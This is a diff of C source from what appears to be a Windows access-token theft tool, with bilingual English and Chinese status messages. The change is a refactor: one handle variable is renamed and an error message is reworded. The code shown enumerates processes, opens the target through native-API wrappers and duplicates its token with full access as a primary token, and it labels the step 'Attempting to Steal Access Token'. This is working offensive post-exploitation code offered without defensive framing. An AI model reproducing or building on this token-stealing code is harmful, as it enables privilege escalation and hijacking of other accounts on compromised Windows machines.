@@ -184,16 +184,16 @@ void SFGetToken(DWORD pid) {
     PSYSTEM_PROCESS_INFORMATION processInfo = (PSYSTEM_PROCESS_INFORMATION)buffer;
     SFPrintStatus("Searching for the Targeted Process", "正在寻找目标进程以进行访问令牌窃取");
     while (1) {
-        HANDLE hProcess = 0xcccccccccccccccc;
+        HANDLE hTokenProcess = 0xcccccccccccccccc;
         OBJECT_ATTRIBUTES objectAttributes;
         CLIENT_ID clientId;
         clientId.UniqueProcess = processInfo->UniqueProcessId;
         clientId.UniqueThread = NULL;
         InitializeObjectAttributes(&objectAttributes, NULL, 0, NULL, NULL);
-        status = SFNtOpenProcess(&hProcess, MAXIMUM_ALLOWED, &objectAttributes, &clientId);
-        if ((hProcess != 0xcccccccccccccccc) && (hProcess != 0) && (DWORD)(ULONG_PTR)processInfo->UniqueProcessId == pid) {
+        status = SFNtOpenProcess(&hTokenProcess, MAXIMUM_ALLOWED, &objectAttributes, &clientId);
+        if ((hTokenProcess != 0xcccccccccccccccc) && (hTokenProcess != 0) && (DWORD)(ULONG_PTR)processInfo->UniqueProcessId == pid) {
             hToken = 0xcccccccccccccccc;
-            status = SFNtOpenProcessToken(hProcess, MAXIMUM_ALLOWED, &hToken);
+            status = SFNtOpenProcessToken(hTokenProcess, MAXIMUM_ALLOWED, &hToken);
             if (hToken != 0xcccccccccccccccc && hToken != 0) {
                 if (processInfo->SessionId == 0) { 
                             SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
@@ -220,13 +220,13 @@ void SFGetToken(DWORD pid) {
                             SFPrintStatus("Attempting to Steal Access Token", "尝试窃取访问令牌");
                             status = SFNtDuplicateToken(hToken, TOKEN_ALL_ACCESS, NULL, FALSE, TokenPrimary, &hDupPriToken);
                 }
-                SFNtClose(hProcess);
+                SFNtClose(hTokenProcess);
                 break;
             }
             if (processInfo->NextEntryOffset == 0)
                 break;
             processInfo = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)processInfo + processInfo->NextEntryOffset);
         }
-        SFPrintError("Target Not Found", "未找到目标");
+        SFPrintError("Target Not Found or Failed to Obtain Token", "未找到目标或获取令牌失败");
         free(buffer);
     }
